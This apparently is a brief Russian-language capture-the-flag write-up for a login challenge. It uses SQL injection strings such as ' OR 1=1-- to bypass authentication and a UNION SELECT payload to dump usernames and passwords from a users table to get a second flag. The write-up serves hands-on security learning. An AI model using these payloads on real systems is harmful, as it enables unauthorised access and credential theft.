## WriteUP
- Для начала посмотрим исходный код элемента, и увиди там подсказку.

<img width="328" alt="Снимок экрана 2024-09-16 в 15 33 11" src="https://github.com/user-attachments/assets/401016f7-f372-4607-ba6f-1a161ad77e14">

- Читаем про SQL injection и пробуем самый простой шаблон, поле пароля можно оставить пустым 
```
' OR 1=1--
или
admin' or 1=1--
```
<img width="1512" alt="Снимок экрана 2024-09-16 в 15 37 13" src="https://github.com/user-attachments/assets/0a739a19-92c1-45ec-9a57-d563079ee4a7">
# Part 2 
- Из условий ясно что есть второй флаг и та же инъекция, значит надо делать более сложный запрос. Из первой части понятно что полей выводится 2 и второе это не пароль и это сильно помогает нам. Составим UNION запрос 

```
' UNION SELECT username, password FROM users--
```
<img width="1512" alt="Снимок экрана 2024-09-16 в 15 40 15" src="https://github.com/user-attachments/assets/69bc9dc4-2417-49a7-b564-3d8c63bbd3fb">
- А вот и флаг
